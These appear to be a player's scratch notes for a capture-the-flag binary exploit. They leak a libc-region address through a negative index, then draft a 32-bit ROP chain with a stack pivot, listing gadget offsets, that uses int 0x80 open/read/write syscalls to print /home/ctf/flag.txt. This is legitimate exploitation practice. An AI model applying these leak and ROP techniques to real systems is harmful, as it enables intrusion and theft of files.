## Leak an address

index> 4294967203
-93: [0xffffc14c] 3705140727 (dcd7f5f7)
becomes 0xf7f5d7dc
return in main_once (starts at 0xf7f5d710)
(.text at 0xf7f5c280)
file base at 0xf7f59000

flag.txt: 0xf7fc714c - 0xf7f5c000

should be able to overwrite with a pop *; ret
pivot via pop esp; pop*; ret? (need 2nd pop to get over length field!)

Ropper:
[11]  .text                0x00003280  0x00003280  PROGBITS

0x0002bfe9: pop esp; mov eax, 0x10; pop edi; ret;

Can int 0x80, ret:
0x00034c60: int 0x80; ret;


Rough outline:

ebx, ecx, edx = args

- open("/home/ctf/flag.txt")
- read(eax, tmpaddr, 256)
- write(1, tmpaddr, eax)

get address of flag.txt string into ebx
clear ecx
0x0002eff9: xor eax, eax; pop ebx; ret;
addr of flag.txt!
0x6b14c (relative to base of file)
0x000544c0: mov ecx, eax; mov eax, ecx; ret;

eax = 5
0x00054450: mov eax, 5; ret;

int 0x80
0x00034c60: int 0x80; ret;

mov ebx, eax
should we just assume fd=3?
0x0000301e: pop ebx; ret;
constant(3)

pop ecx, ...? some buffer space
0x0006a4d6: pop eax; ret;
(TODO) .data address?
0x000544c0: mov ecx, eax; mov eax, ecx; ret;

mov edx, <some reasonable value>
0x0006a4d6: pop eax; ret;
256
0x000607c7: xchg eax, edx; ret;

eax = 3
0x00054430: mov eax, 3; ret;
int 0x80
0x00034c60: int 0x80; ret;

mov edx, eax
0x000607c7: xchg eax, edx; ret;
mov ecx, same buffer address
0x0006a4d6: pop eax; ret;
(TODO) .data address?
0x000544c0: mov ecx, eax; mov eax, ecx; ret;
mov ebx, 1
0x0000301e: pop ebx; ret;
1

eax = 4
0x00054440: mov eax, 4; ret;
int 0x80
0x00034c60: int 0x80; ret;

where to use for slack space?
data @ 0xf7ffb000
but maybe have register already?


Scratch:
0x0003ebd1: xchg eax, edi; ret; 
0x000607c7: xchg eax, edx; ret;

